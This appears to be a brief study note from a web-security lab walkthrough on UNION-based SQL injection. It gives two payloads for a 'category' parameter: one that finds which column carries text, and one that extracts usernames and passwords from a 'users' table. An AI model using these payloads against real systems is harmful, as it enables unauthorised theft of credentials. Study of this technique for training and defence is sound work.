---
dg-publish: true
---






- Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the `category` parameter:

```Plain
'+UNION+SELECT+NULL,'abc'--
```

- Retrieve the contents of the `users` table:
    - `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`